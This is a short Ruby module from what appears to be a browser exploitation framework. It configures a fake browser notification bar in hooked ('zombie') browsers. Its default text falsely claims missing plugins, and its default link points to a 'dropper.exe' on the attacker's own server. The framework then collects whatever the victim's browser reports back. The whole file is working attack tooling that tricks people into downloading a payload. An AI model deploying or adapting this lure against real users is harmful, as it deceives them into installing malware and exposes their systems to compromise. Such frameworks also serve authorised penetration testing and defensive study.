#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (Server) - https://serverproject.com
# See the file 'doc/COPYING' for copying permission
#
class Fake_notification_c < Server::Core::Command
  def self.options
    @configuration = Server::Core::Configuration.instance
    proto = @configuration.server_proto
    server_host = @configuration.server_host
    server_port = @configuration.server_port
    base_host = "#{proto}://#{server_host}:#{server_port}"

    [
      { 'name' => 'url', 'ui_label' => 'URL', 'value' => "#{base_host}/dropper.exe", 'width' => '150px' },
      { 'name' => 'notification_text',
        'description' => 'Text displayed in the notification bar',
        'ui_label' => 'Notification text',
        'value' => 'Additional plugins are required to display all the media on this page.' }
    ]
  end

  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    content = {}
    content['result'] = @datastore['result']
    save content
  end
end
